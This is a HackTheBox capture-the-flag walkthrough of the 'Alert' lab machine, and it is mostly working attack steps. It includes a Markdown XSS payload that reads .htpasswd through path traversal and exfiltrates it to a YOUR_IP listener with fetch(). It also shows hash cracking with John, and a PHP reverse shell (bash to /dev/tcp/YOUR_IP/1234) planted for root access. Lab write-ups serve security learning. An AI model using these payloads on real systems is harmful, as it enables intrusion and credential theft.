# HackTheBox — Alert Writeup  
**Difficulty:** Easy/
**Author:** Mridul chamoli 
**Machine IP:** 10.10.11.44  

---

# 🛰️ 1. Enumeration

## 🔍 1.1 Nmap Scan

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nmap -sC -sV 10.10.11.44
Output:

arduino
Copy code
22/tcp  open  ssh   OpenSSH 8.2p1
80/tcp  open  http  Apache 2.4.41
Add domain:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ sudo nano /etc/hosts
Add:

Copy code
10.10.11.44 alert.htb
🌐 2. Subdomain Enumeration
bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ffuf -u http://alert.htb/ \
-H "Host: FUZZ.alert.htb" \
-w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -ac
Found:

pgsql
Copy code
statistics.alert.htb
Add it:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ sudo nano /etc/hosts
pgsql
Copy code
10.10.11.44 statistics.alert.htb
🪝 3. Foothold (Markdown XSS → LFI → File Exfiltration)
Start listener:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ python3 -m http.server 8888
Create malicious Markdown file:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nano steal.md
Paste:

html
Copy code
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://YOUR_IP:8888/?file_content=" + encodeURIComponent(data));
  });
</script>
Upload → Copy Share Link → Submit the link inside Contact Us.

Your listener receives the .htpasswd content:

powershell
Copy code
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
🔓 4. Cracking Password
Save hash:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
Crack with John:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt
John outputs:

yaml
Copy code
albert : PASSWORD
SSH into the machine:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ssh albert@alert.htb
You now have user access.

📈 5. Privilege Escalation
Upload linpeas:

bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ scp linpeas.sh albert@alert.htb:/tmp/linpeas.sh
Run it:

bash
Copy code
albert@alert:~$ bash /tmp/linpeas.sh
🔎 Key Finding:
Service running at localhost:8080

Writable directory:

bash
Copy code
/opt/website-monitor/config  (drwxrwxr-x root:albert)
This directory is executed by the local 8080 web service → perfect for RCE.

🐚 6. Root Shell via PHP Reverse Shell
6.1 Create reverse shell
bash
Copy code
albert@alert:~$ nano /opt/website-monitor/config/shell.php
Paste:

php
Copy code
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'");
?>
6.2 Port Forwarding
bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ssh -L 8080:127.0.0.1:8080 albert@alert.htb
6.3 Start Listener
bash
Copy code
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nc -lvnp 1234
6.4 Trigger the Reverse Shell
Open browser:

arduino
Copy code
http://127.0.0.1:8080/config/shell.php
Listener receives:

ruby
Copy code
root@alert:/# id
uid=0(root) gid=0(root)
🎉 ROOT Obtained

🏁 7. Flags
User:

bash
Copy code
albert@alert:~$ cat user.txt
Root:

bash
Copy code
root@alert:/root$ cat root.txt
🧩 Summary of Attack Path
Stage	Technique
Foothold	Markdown XSS → SSRF → LFI
User shell	Cracked Apache MD5 hash
PrivEsc	Writable config folder → PHP RCE
Root	Reverse shell executed by internal web service
